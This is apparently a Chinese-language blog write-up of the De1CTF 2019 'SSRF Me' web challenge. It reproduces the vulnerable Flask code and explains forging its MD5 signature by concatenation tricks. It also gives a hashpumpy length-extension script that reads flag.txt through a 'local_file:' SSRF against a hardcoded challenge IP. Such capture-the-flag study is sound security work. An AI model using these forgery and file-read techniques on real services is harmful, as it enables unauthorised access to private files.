---
title: De1CTF 2019 web
date: 2020-11-15 09:04:08
tags: CTF WEB
categories: CTF做题记录
---

<!-- TOC -->

- [[De1CTF 2019]SSRF Me](#de1ctf-2019ssrf-me)

<!-- /TOC -->

<!--more-->
# [De1CTF 2019]SSRF Me
```python
#! /usr/bin/env python
#encoding=utf-8
from flask import Flask
from flask import request
import socket
import hashlib
import urllib
import sys
import os
import json
reload(sys)
sys.setdefaultencoding('latin1')

app = Flask(__name__)

secert_key = os.urandom(16)


class Task:
    def __init__(self, action, param, sign, ip):
        self.action = action
        self.param = param
        self.sign = sign
        self.sandbox = md5(ip)
        if(not os.path.exists(self.sandbox)):          #SandBox For Remote_Addr
            os.mkdir(self.sandbox)

    def Exec(self):
        result = {}
        result['code'] = 500
        if (self.checkSign()):
            if "scan" in self.action:
                tmpfile = open("./%s/result.txt" % self.sandbox, 'w')
                resp = scan(self.param)
                if (resp == "Connection Timeout"):
                    result['data'] = resp
                else:
                    print resp
                    tmpfile.write(resp)
                    tmpfile.close()
                result['code'] = 200
            if "read" in self.action:
                f = open("./%s/result.txt" % self.sandbox, 'r')
                result['code'] = 200
                result['data'] = f.read()
            if result['code'] == 500:
                result['data'] = "Action Error"
        else:
            result['code'] = 500
            result['msg'] = "Sign Error"
        return result

    def checkSign(self):
        if (getSign(self.action, self.param) == self.sign):
            return True
        else:
            return False


#generate Sign For Action Scan.
@app.route("/geneSign", methods=['GET', 'POST'])
def geneSign():
    param = urllib.unquote(request.args.get("param", ""))
    action = "scan"
    return getSign(action, param)


@app.route('/De1ta',methods=['GET','POST'])
def challenge():
    action = urllib.unquote(request.cookies.get("action"))
    param = urllib.unquote(request.args.get("param", ""))
    sign = urllib.unquote(request.cookies.get("sign"))
    ip = request.remote_addr
    if(waf(param)):
        return "No Hacker!!!!"
    task = Task(action, param, sign, ip)
    return json.dumps(task.Exec())
@app.route('/')
def index():
    return open("code.txt","r").read()


def scan(param):
    socket.setdefaulttimeout(1)
    try:
        return urllib.urlopen(param).read()[:50]
    except:
        return "Connection Timeout"



def getSign(action, param):
    return hashlib.md5(secert_key + param + action).hexdigest()


def md5(content):
    return hashlib.md5(content).hexdigest()


def waf(param):
    check=param.strip().lower()
    if check.startswith("gopher") or check.startswith("file"):
        return True
    else:
        return False


if __name__ == '__main__':
    app.debug = False
    app.run(host='0.0.0.0')
```

三个路由

- `/geneSign` 将secert_key + param + action进行md5加密
- `/De1ta` 挑战页
- `/` 获取源码

1. 先说第一个字符拼接\
    思路：\
    提示flag为`./flag.txt`，再Task类中每个子if均没有break，也就是说可以经过Task类可以将flag写道沙盒里面，再读出来\
    在挑战页有三个参数可控，要想读flag，需要`action=readscan`, `param=flag`, `sign=getSign(action, param)`

    解题：

    1. 先访问`/geneSign`页，其内部`action = "scan"`，md5加密时为字符串拼接，如果传参`parma=flag.txtread`，那么在加密时字符串为`hashlib.md5(secert_keyflag.txtreadscan)`，那这么md5就符合思路的`sign=getSign(action, param)`，可以进行先写flag在读取\
    2. 然后在访问`/De1ta`，传参`?param=flag.txt`，在cookie中写入`action=scanread;sign=ed3d434b5918a762ef9a783f27b0111b`即可获取flag

2. 哈希拓展攻击\
[原理在这](https://joychou.org/web/hash-length-extension-attack.html)
```python
#!/usr/bin/python
# -*- coding:utf-8 -*- 
# @author:一叶飘零

import hashpumpy
import requests
import urllib

url = 'local_file:flag.txt'
r = requests.get('http://139.180.128.86/geneSign?param='+url)
old_sign = r.content
new_sign = hashpumpy.hashpump(old_sign, url + 'scan', 'read', 16)
cookies={
'sign': new_sign[0],
'action': urllib.quote(new_sign[1][19:])
}
r = requests.get('http://139.180.128.86/De1ta?param='+url, cookies=cookies)
print(r.content)
```